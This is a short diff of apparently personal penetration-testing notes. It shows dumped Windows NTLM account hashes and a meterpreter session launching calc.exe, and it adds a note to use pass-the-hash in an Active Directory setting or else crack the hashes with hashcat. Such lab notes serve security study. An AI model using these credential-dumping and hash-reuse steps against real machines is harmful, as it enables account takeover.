@@ -97,7 +97,10 @@
         HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:87d8f24dad52ed0401ec399facbca46c:::
         user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
 
+        IF it was in AD Scenario we will use PTH Attack 
 
+        Else We can use hashcat 
+        
     Screen Capture:
         meterpreter > execute -f calc.exe
         Process 3020 created.
